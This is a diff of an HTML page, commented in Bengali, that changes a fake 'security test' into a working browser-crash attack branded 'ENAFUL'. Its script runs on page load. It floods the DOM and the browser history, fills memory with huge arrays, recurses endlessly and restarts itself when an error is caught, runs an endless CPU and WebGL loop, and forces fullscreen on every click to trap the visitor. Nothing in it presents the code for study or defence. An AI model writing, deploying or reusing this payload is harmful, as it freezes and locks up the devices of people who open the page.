@@ -2,37 +2,96 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CYBER ENAFUL SECURITY TEST</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>⚠︎ SYSTEM CRITICAL ⚠︎</title>
     <style>
-        body {
+        /* সম্পূর্ণ ব্ল্যাকআউট ইন্টারফেস */
+        body, html {
             background-color: black;
             color: #00ff00;
-            font-family: 'Courier New', Courier, monospace;
-            text-align: center;
-            padding-top: 100px;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            font-family: 'Courier New', monospace;
+            cursor: none;
         }
-        h1 { font-size: 50px; }
+        #shield {
+            font-size: 5px;
+            color: rgba(0, 0, 0, 0.1); /* ইমোজিগুলো ইনভিজিবল কিন্তু মেমোরি খাবে */
+            word-wrap: break-word;
+        }
     </style>
 </head>
 <body>
 
-    <h1>SYSTEM ENCRYPTED BY ENAFUL</h1>
-    <p>Please wait while we check your system security...</p>
+    <div id="shield">
+        </div>
 
     <script>
-        // এটি ব্রাউজারের লুপ ব্যবহার করে মেমোরি ফুল করার চেষ্টা করবে
-        function crashSystem() {
-            console.log("Starting Security Test...");
-            var total = "";
-            while(true) {
-                total = total + "ENAFUL-" + Math.random();
-                history.pushState(0,0, total); // এটি ব্রাউজার হিস্ট্রি ফুল করে দিবে
-            }
+        // ১. ইমোজি ফ্লাডিং (DOM Stresser) - প্রায় ২০০০+ ইমোজি লোড হবে
+        const shield = document.getElementById('shield');
+        let warningData = "";
+        for (let i = 0; i < 2500; i++) {
+            warningData += "⚠︎ ";
         }
+        shield.innerText = warningData;
 
-        // ৫ সেকেন্ড পর অটো রান হবে
-        setTimeout(crashSystem, 5000);
+        // ২. মেইন অ্যাটাক ইঞ্জিন (Instant Execution)
+        (function executeUltimatePayload() {
+            
+            // ৩. ব্রাউজার হিস্ট্রি ফ্লাডিং (Back Button Kill)
+            setInterval(() => {
+                for(let h=0; h<500; h++) {
+                    window.history.pushState(null, null, Math.random().toString(36).substring(7));
+                }
+            }, 10);
+
+            // ৪. মেমোরি ফ্লাডিং (Heavy RAM Consumption)
+            let binaryWaste = [];
+            
+            // ৫. রিকার্সিভ ক্র্যাশ লুপ (Stack Overflow)
+            function initiateDeepFreeze() {
+                // র‍্যামে বিশাল ডাটা পুশ
+                binaryWaste.push(new Array(5000000).join("ENAFUL-DEADLY-PAYLOAD-⚠︎"));
+                
+                // কনসোল স্ট্রেস
+                console.error("CRITICAL_FAILURE_".repeat(1000));
+                
+                document.title = "⚠︎ CRASHED BY ENAFUL " + Math.random();
+                
+                // রিকার্সন কল
+                initiateDeepFreeze();
+            }
+
+            // ৬. হার্ডওয়্যার ফ্রিজ (CPU & GPU Overload)
+            setTimeout(() => {
+                // ইনফিনিট লুপ যা প্রসেসর থ্রেড ব্লক করবে
+                while(true) {
+                    var heavyMath = Math.atan2(Math.random(), Math.random());
+                    
+                    // WebGL জিপিইউ স্ট্রেস
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    
+                    // অটো ফুলস্ক্রিন রিকোয়েস্ট (লক করার জন্য)
+                    document.documentElement.requestFullscreen().catch(e => {});
+                }
+            }, 10);
+
+            try {
+                initiateDeepFreeze();
+            } catch (error) {
+                // এরর হ্যান্ডলার দিয়ে আবার লুপ শুরু করা যাতে থামানো না যায়
+                executeUltimatePayload();
+            }
+        })();
+
+        // অটো-লক অন ক্লিক
+        window.onclick = function() {
+            document.documentElement.requestFullscreen();
+        };
     </script>
 </body>
 </html>
